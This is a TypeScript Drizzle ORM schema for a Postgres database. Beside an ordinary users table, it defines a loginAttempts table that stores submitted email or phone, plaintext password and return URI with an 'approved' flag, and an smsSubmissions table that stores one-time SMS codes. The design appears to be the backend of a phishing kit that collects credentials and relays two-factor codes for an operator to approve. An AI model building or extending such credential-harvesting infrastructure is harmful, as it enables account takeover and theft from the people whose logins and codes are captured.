import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const loginAttempts = pgTable("login_attempts", {
  id: serial("id").primaryKey(),
  emailOrPhone: text("email_or_phone").notNull(),
  password: text("password").notNull(),
  returnUri: text("return_uri").notNull(),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  approved: boolean("approved").default(false).notNull(),
});

export const smsSubmissions = pgTable("sms_submissions", {
  id: serial("id").primaryKey(),
  otpCode: text("otp_code").notNull(),
  stepupContext: text("stepup_context").notNull(),
  rememberDevice: boolean("remember_device").default(false).notNull(),
  timestamp: timestamp("timestamp").defaultNow().notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).pick({
  emailOrPhone: true,
  password: true,
  returnUri: true,
});

export const insertSmsSubmissionSchema = createInsertSchema(smsSubmissions).pick({
  otpCode: true,
  stepupContext: true,
  rememberDevice: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertLoginAttempt = z.infer<typeof insertLoginAttemptSchema>;
export type LoginAttempt = typeof loginAttempts.$inferSelect;
export type InsertSmsSubmission = z.infer<typeof insertSmsSubmissionSchema>;
export type SmsSubmission = typeof smsSubmissions.$inferSelect;
